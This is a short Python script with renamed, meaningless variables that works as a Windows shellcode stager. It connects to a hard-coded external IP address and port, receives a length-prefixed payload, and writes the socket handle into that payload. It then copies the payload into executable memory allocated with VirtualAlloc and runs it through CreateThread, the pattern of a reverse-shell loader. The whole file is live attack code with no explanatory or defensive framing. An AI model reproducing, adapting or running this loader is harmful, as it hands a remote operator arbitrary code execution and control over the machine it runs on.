import struct, socket, binascii, ctypes as ctypes, random, time
var1, var2 = None, None
def func1():
	try:
		global var2
		var2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		var2.connect(('47.111.239.107', 8444))
		var3 = struct.pack('<i', var2.fileno())
		l = struct.unpack('<i', var2.recv(4))[0]
		datastream = b"     "
		while len(datastream) < l: datastream += var2.recv(l)
		cbuffer = ctypes.create_string_buffer(datastream, len(datastream))
		cbuffer[0] = binascii.unhexlify('BF')
		for i in range(4): cbuffer[i+1] = var3[i]
		return cbuffer
	except: return None
def func2(arg3):
	if arg3 != None:
		arg4 = bytearray(arg3)
		var4 = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(arg4)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		var5 = (ctypes.c_char * len(arg4)).from_buffer(arg4)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(var4), var5, ctypes.c_int(len(arg4)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(var4),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
var1 = func1()
func2(var1)
